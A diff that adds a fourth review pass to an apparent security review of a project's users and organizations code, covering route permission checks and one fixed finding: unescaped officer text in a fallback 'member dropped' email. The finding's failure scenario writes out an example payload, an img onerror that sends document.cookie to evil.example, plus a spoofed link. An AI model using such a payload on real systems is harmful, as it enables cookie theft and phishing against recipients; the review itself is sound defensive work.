@@ -1,6 +1,237 @@
 # Security Review 07 — Users & Organizations
 
-**Prefix:** `USR` · **Iteration:** 07 · **Reviewed:** 2026-08-25 (pass 1), 2026-08-27 (pass 2), 2026-09-02 (pass 3) · **PR:** [#1814](https://github.com/thegspiro/the-logbook/pull/1814) (pass 1), [#1949](https://github.com/thegspiro/the-logbook/pull/1949) (pass 2)
+**Prefix:** `USR` · **Iteration:** 07 · **Reviewed:** 2026-08-25 (pass 1), 2026-08-27 (pass 2), 2026-09-02 (pass 3), 2026-09-08 (pass 4) · **PR:** [#1814](https://github.com/thegspiro/the-logbook/pull/1814) (pass 1), [#1949](https://github.com/thegspiro/the-logbook/pull/1949) (pass 2), PR pending (pass 4)
+
+---
+
+## Pass 4 (2026-09-08)
+
+**Scope:** full domain since pass 3's merge commit `b267ee1` (PR #2280):
+`endpoints/users.py`, `endpoints/organizations.py`, `endpoints/member_status.py`,
+`endpoints/member_leaves.py`, `services/user_service.py`,
+`services/organization_service.py`, `services/member_leave_service.py`,
+`models/user.py`, `schemas/user.py`, `schemas/organization.py`, every
+migration touching these tables since, and the in-app frontend surface — a
+`git diff --stat` against `frontend/src/` since `b267ee1` (191 files, mostly
+unrelated scheduling/mobile-accessibility work), narrowed to every hit on
+user/organization/member terms.
+
+**Read in full (diff-driven):** the six-site `users.py` defense-in-depth diff
+(`1d580ea`, org-filtering re-reads that were already safe by construction —
+not a finding, a hardening pass from a different, already-closed tenancy
+burn-down; re-verified each of the six sites still carries the added
+`organization_id` clause and the comment explaining why it is redundant); the
+new `frontend/src/pages/members/admin/settings/` module (`MembersSettingsPage`,
+`MembershipIdSection`, `ContactVisibilitySection`, `membersSettingsSections.ts`,
+`MembersSettingsRedirect`) and its three backing routes in `organizations.py`
+(`GET`/`PATCH /settings/membership-id`, `GET /settings/membership-id/preview`)
+— new since a prior pass but present, unchanged, since before pass 3's merge
+point (route-count reconciliation below); `OrganizationService.
+generate_next_membership_id`'s row-locking counter (CLAUDE.md Pitfall #27 —
+correctly locks the parent row `with_for_update()` before the uniqueness
+scan, and deep-copies the JSON settings before mutating, Pitfall #12); the
+`Members.tsx`/`MembersAdminHub.tsx` `members.create`→`users.create` permission
+correction (a pre-existing frontend/backend permission-string mismatch that
+sent officers holding `members.manage` but not `users.create` to a button
+that would 403 — fixed by a prior, non-security-review change; re-verified
+against the real gate on `POST /users` rather than taken on the commit
+message's word); and, reading `member_status.py`'s lines 1-281 (pass 3
+explicitly left unread — see its own scope note), the full lifecycle state
+machine and the property-return-email fallback path, which is where this
+pass's finding is.
+
+**Re-enumerated, not re-derived:** all 65 routes across the four files (26 +
+20 + 12 + 7 — up from pass 3's stated 62/61; reconciled below, not a
+regression) — every route's auth dependency and permission string checked
+against the route inventory below by mechanical AST-style extraction, not
+sampling. Every by-id (`{user_id}`, `{leave_id}`) fetch in all four files
+re-traced for an `organization_id` filter (XC-3), and the one client-supplied
+FK on a create path (`member_leaves.py`'s `create_leave_of_absence` →
+`MemberLeaveService.create_leave`) re-traced for its in-org check (XC-1). All
+three new `organizations.py` membership-id routes checked individually:
+`PATCH` is gated `require_permission("settings.edit",
+"organization.update_settings")` — verified `settings.edit` is held only by
+`president`/`it_manager` (wildcard) among the 27 seeded positions (`grep`
+across `DEFAULT_POSITIONS`; no other position — including `secretary`,
+`treasurer`, `membership_coordinator`, `vice_president`,
+`board_of_directors` — carries it), so this is not an over-broad grant
+relative to its sibling `/settings/*` PATCH routes. Both `GET` routes are
+bare-auth, org-scoped exclusively by `current_user.organization_id` — the
+same already-audited third category ORU-8b/pass-1's route inventory
+documents for `/settings`, `/modules`, `/profile`, and the values they
+return (an ID-format prefix/next-number preview) carry no PII or secret.
+
+**Route-count reconciliation:** `users.py` 24→26 and `organizations.py`
+19→20 against pass 3's stated totals, with **zero** line-level diff on either
+file between pass 3's merge commit and the membership-id routes' introduction
+— i.e., the code was already live at pass 3's review point and pass 3's own
+count was short by two and one respectively, not a new addition slipping
+through unreviewed. Confirmed by `git diff b267ee1..HEAD --stat` returning
+empty for `organizations.py`/`schemas/organization.py` entirely, and only the
+six-site defense-in-depth diff for `users.py`. Each of the newly-counted
+routes was individually re-verified this pass regardless (membership-id ×3
+above; the remaining users.py discrepancy is `get_deletion_impact`, already
+covered under pass 1's "Verified good" ceiling/redaction sweep by file
+but not previously named in a per-route count).
+
+**Not re-read line-by-line:** `organization_service.py`'s non-module-settings,
+non-membership-id methods — no diff signal since pass 3 pointed at either;
+`schemas/organization.py` — zero diff since pass 3.
+
+## Findings (pass 4)
+
+### USR-9 — MED — The property-return-drop email's fallback template interpolated `reason`/`member_name`/`performed_by_name` into HTML with no escaping, and the same `re.sub` call would raise on a literal backslash-digit sequence in that text — ✅ FIXED
+
+**What:** `_send_property_return_email` (`member_status.py`) sends the
+formal "membership status changed to dropped" notice to the departed
+member's own email address(es) and to every admin role in
+`ADMIN_NOTIFY_ROLE_SLUGS` (CC), for every `dropped_voluntary`/
+`dropped_involuntary` status change (`PATCH /users/{user_id}/status`,
+`members.manage`-gated). When the organization has never opened the Email
+Templates admin screen — `ensure_default_templates()` is only called from
+`GET /email-templates`, so no `MEMBER_DROPPED` row exists in most
+departments that haven't customized their notification wording — the
+function falls back to `DEFAULT_MEMBER_DROPPED_HTML`/`_TEXT` and builds the
+message itself with a raw `re.sub(pattern, str(val), rendered_html)` loop,
+**bypassing** `EmailTemplateService.render()`/`_replace_variables()`, which
+is the one place in this codebase that HTML-escapes template context values
+(and is exactly what runs instead when a custom template _does_ exist — so
+the two code paths for the same email disagreed on escaping). `reason` is
+the officer's own free-text field on the status-change request; `member_name`
+and `performed_by_name` are stored `full_name` values which are themselves
+ordinary editable profile fields. None of the three were escaped before
+being spliced into the HTML body.
+
+A second defect in the same loop compounds it: `re.sub`'s replacement
+argument, when passed as a plain string (not a callable), undergoes its own
+backslash processing — `\1`, `\g<name>`, etc. A `reason` containing a literal
+backslash-digit sequence (plausible in ordinary text — "returned 3 of 4
+items\1 outstanding", a pasted file path, a stray OCR artifact) raises
+`re.error: invalid group reference` **inside the try/except that is supposed
+to make this function never fail the drop itself** — confirmed by the guard
+test below, which reproduced `invalid group reference 1 at position 46`
+against the pre-fix code. The exception is caught and logged, so the drop
+still succeeds, but the notification email silently never sends — the same
+"switch is stored, nothing consumes it" failure shape as CLAUDE.md Pitfall
+#19, one layer down.
+
+**Where:** `backend/app/api/v1/endpoints/member_status.py:247-265` (now
+`:247-283` after the fix).
+
+**Failure scenario:** an officer holding `members.manage` (a role held far
+more broadly than `settings.manage` — every `membership_coordinator`,
+`secretary`, `president`, and several others) drops a member with
+`reason: "<img src=x onerror=fetch('https://evil.example/c?d='+document.cookie)>"`
+or, more realistically for a phishing angle most email clients cannot
+script-block, a `reason` with injected `<a href="https://evil.example">`
+markup styled to look like a legitimate "dispute this notice" link. The
+formatted HTML notice — carrying that markup unescaped — reaches the
+departed member's inbox and every CC'd admin's inbox. Separately, and
+without any malicious intent at all, an officer typing an ordinary reason
+that happens to contain a backslash-digit sequence silently loses the
+notification entirely, with no error surfaced anywhere the officer can see
+(the exception is caught inside a `BackgroundTasks` callback and only
+`logger.error`'d).
+
+**Impact:** MED. Not a cross-tenant leak, and not reachable by more than a
+`members.manage` holder — but it is a live HTML-injection path into an
+outbound notification reaching multiple recipients, on the fallback path
+most departments actually use (no template customization needed to trigger
+it), and it silently drops the notification for a plausible class of benign
+input. Checklist §4 ("User text in email HTML is `html.escape`d") names this
+class directly.
+
+**Fix:** the fallback loop now `html.escape()`s every context value before
+substituting into `rendered_html` (except `items_list_html`, which is
+already pre-escaped markup built by `build_items_list_html` — matching
+`_RAW_HTML_VARIABLES`'s treatment of the same key in
+`email_template_service.py`, so the two rendering paths agree on which
+values are markup and which are text). `rendered_text` is **not** escaped —
+matching `_replace_variables`'s own `escape_html=False` rule for the plain-
+text alternative, since escaping there would corrupt an ordinary name like
+"O'Brien" for no security benefit (nothing there is parsed as markup). Both
+substitutions now pass the replacement as a closure (`lambda _m, v=val: v`)
+rather than a raw string, so a value cannot be misread as a backreference —
+this is what fixes the `re.error` crash, independent of the escaping
+question. Guarded by
+`tests/test_member_status_transitions.py::test_default_property_return_email_escapes_html_but_not_text`,
+which drives the real fallback path (a `TemplateService.get_template`
+stub returning `None`, matching the "no customized template" condition) with
+a `reason` containing both an unescaped `<img onerror>` payload and a literal
+`\1`, and asserts: the markup is escaped in `html_body`, present verbatim in
+`text_body`, and the backslash sequence survives in both without raising —
+confirmed to fail against the pre-fix code (`KeyError` because the exception
+was swallowed before `send_email` was ever called, with the exact
+`invalid group reference 1 at position 46` logged) via `git stash`, and to
+pass after the fix.
+
+## Verified good ✅ (re-confirmed pass 4)
+
+- **All privilege-ceiling wiring re-confirmed at its documented call sites**,
+  read directly rather than taken on pass 1-3's word:
+  `_enforce_role_grant_ceiling` in `create_member` and both
+  `assign_user_roles`/`add_role_to_user`; `_enforce_rank_grant_ceiling` in
+  `create_member` and `update_user_profile`'s rank-change branch (including
+  the locked, `populate_existing=True` read and the `member_class`/
+  administrative-rank consistency checks pass 2 added); `assign_user_roles`'s
+  `assert_positions_retain_administrator` last-admin guard on a full-replace
+  role assignment; `admin_reset_password`/`admin_reset_mfa`'s self-block
+  (`if str(user_id) == str(current_user.id): raise 400`) plus
+  `_enforce_account_reset_ceiling`.
+- **Self-or-admin gating re-confirmed by direct read on every bare-`get_
+current_user` mutation**: `update_contact_info`, `update_user_profile`,
+  `upload_photo`, `delete_photo`, `get_user_consents`, `get_member_leaves` —
+  each checks `str(current_user.id) == str(user_id)` before falling back to
+  a permission check, and each subsequent DB fetch is org-scoped.
+- **Every by-id fetch across all four files still org-scopes**, including
+  the six sites pass 3 flagged for pass 4 to watch (`assign_user_roles`,
+  `add_role_to_user`, `remove_role_from_user`, `update_contact_info`,
+  `update_user_profile`'s post-commit re-reads) — now carrying an explicit,
+  redundant `organization_id` clause from the separate tenancy burn-down
+  (`1d580ea`), read directly rather than inferred from the commit message.
+- **The one client-supplied FK on a create path (XC-1) still validated**:
+  `create_leave_of_absence`'s `user_id`, unchanged since pass 2/3
+  (`member_leave_service.py:108-118`).
+- **`organizations.py` still has no by-id path parameter across all 20
+  routes** (up one from pass 3's 19, reconciled above) — every response
+  still derives exclusively from `current_user.organization_id`.
+- **New membership-ID counter is correctly locked and deep-copied.**
+  `OrganizationService.generate_next_membership_id` locks the organization
+  row (`with_for_update()`) before reading the counter, matching CLAUDE.md
+  Pitfall #27 (two concurrent member creations cannot mint duplicate IDs),
+  and uses `copy.deepcopy(org.settings or {})` before mutating the nested
+  `membership_id` key, matching Pitfall #12.
+- **Secrets stay redacted; USR-5 and USR-8 re-verified still open, current
+  line numbers unchanged** (no diff on either file/region since pass 3) —
+  not re-flagged with new text, mirrored forward as-is.
+- **No new `.ilike()`/`.like()`, raw `csv.writer`, or `window.confirm`/
+  `alert`/`prompt`** in any of the four backend files or the new frontend
+  settings module (grepped fresh this pass).
+
+## Completion gate (pass 4)
+
+| Check                                                                                                                                                                                           | Result                                                                                                                                                     |
+| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `flake8 app/ tests/ alembic/`                                                                                                                                                                   | ✅ 0 violations                                                                                                                                            |
+| `black --check app/ tests/ alembic/`                                                                                                                                                            | ✅ clean (1536 files unchanged)                                                                                                                            |
+| `isort --check-only app/ tests/ alembic/` (9.0.1, CI's pin)                                                                                                                                     | ✅ clean                                                                                                                                                   |
+| `validate_migrations.py --strict`                                                                                                                                                               | ✅ 438 revisions, single head — unchanged (no migration needed)                                                                                            |
+| `pytest tests/ -k "member_status or member_leave or property_return or user_list or platoon or users or organization or rank_grant or role_edit or audit_history or ceiling or administrative"` | ✅ 433 passed, 1 skipped (pre-existing `py_vapid`), 0 failed                                                                                               |
+| `pytest tests/` (full backend suite)                                                                                                                                                            | ✅ 11851 passed, 21 skipped (pre-existing/environmental: Docker daemon/registry unavailable, `py_vapid` optional dep, opt-in API-contract suite), 0 failed |
+| `tsc --noEmit` (`npm run typecheck`, aliased-compiler wrapper)                                                                                                                                  | ✅ 0 errors                                                                                                                                                |
+| `eslint .` (`npm run lint`)                                                                                                                                                                     | ✅ 0 errors, 2 pre-existing warnings (unrelated `CallTypeChips.tsx`), well under the max-warnings-10 threshold — no frontend file modified this pass       |
+
+`npm ci` was run at the worktree root before the first `npm run lint`
+attempt, per this rotation's known worktree quirk — the first attempt showed
+1116 warnings from unresolved TypeScript types (a stale `node_modules`
+resolution), which vanished entirely after `npm ci`, confirming it was the
+documented false-positive noise and not a regression.
+
+The USR-9 guard test was confirmed to fail against the pre-fix code via
+`git stash` before being counted as covering the finding (reproduced both
+halves: the escaping gap, via a `KeyError` on `captured["html_body"]`
+because the exception below it was swallowed, and the `re.sub` crash itself,
+logged as `invalid group reference 1 at position 46`).
 
 ---
 
